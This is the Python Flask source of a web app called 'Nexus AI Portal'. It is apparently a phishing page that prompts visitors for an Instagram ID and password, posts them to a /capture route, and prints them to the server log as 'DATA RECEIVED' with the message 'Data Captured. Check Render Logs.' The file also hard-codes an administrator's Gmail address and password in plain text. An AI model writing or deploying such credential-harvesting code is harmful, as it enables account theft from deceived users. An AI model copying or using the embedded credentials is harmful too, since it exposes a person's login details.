import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- ADMIN DETAILS ---
A_E = "nexusai119@gmail.com"
A_P = "prashant@123456"

STYLE = "<style>body{background:#0f172a;color:white;text-align:center;padding-top:50px;font-family:sans-serif;}.card{background:#1e293b;display:inline-block;padding:30px;border-radius:15px;border:2px solid #38bdf8;width:300px;}input{display:block;width:90%;padding:12px;margin:15px auto;border-radius:8px;border:1px solid #334155;background:#0f172a;color:white;}button{background:#38bdf8;color:#0f172a;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;width:100%;}</style>"

@app.route('/')
def home():
    return f"<html>{STYLE}<body><div class='card'><h2>🚀 Nexus AI Portal</h2><form method='POST' action='/capture'><input name='u' placeholder='Instagram ID' required><input name='p' type='password' placeholder='Password' required><button type='submit'>Login & Start</button></form><br><a href='/admin' style='color:#94a3b8;text-decoration:none;font-size:12px;'>🛡️ Admin Access</a></div></body></html>"

@app.route('/capture', methods=['POST'])
def capture():
    print(f"\\n[!] DATA RECEIVED: {request.form.get('u')} | {request.form.get('p')}\\n")
    return f"<html>{STYLE}<body><div class='card'><h2>✅ Success!</h2><p>Data Captured. Check Render Logs.</p><button onclick='location.href=\"/\"'>Back</button></div></body></html>"

@app.route('/admin')
def admin():
    return f"<html>{STYLE}<body><div class='card'><h2>🛡️ Admin Login</h2><form method='POST' action='/verify'><input name='e' placeholder='Gmail'><input name='ps' type='password' placeholder='Pass'><button style='background:#fbbf24;'>Unlock</button></form></div></body></html>"

@app.route('/verify', methods=['POST'])
def verify():
    if request.form.get('e') == A_E and request.form.get('ps') == A_P:
        return "<h1>Welcome Prashant! Automation is Active.</h1>"
    return "<h1>Invalid!</h1><a href='/admin'>Try Again</a>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
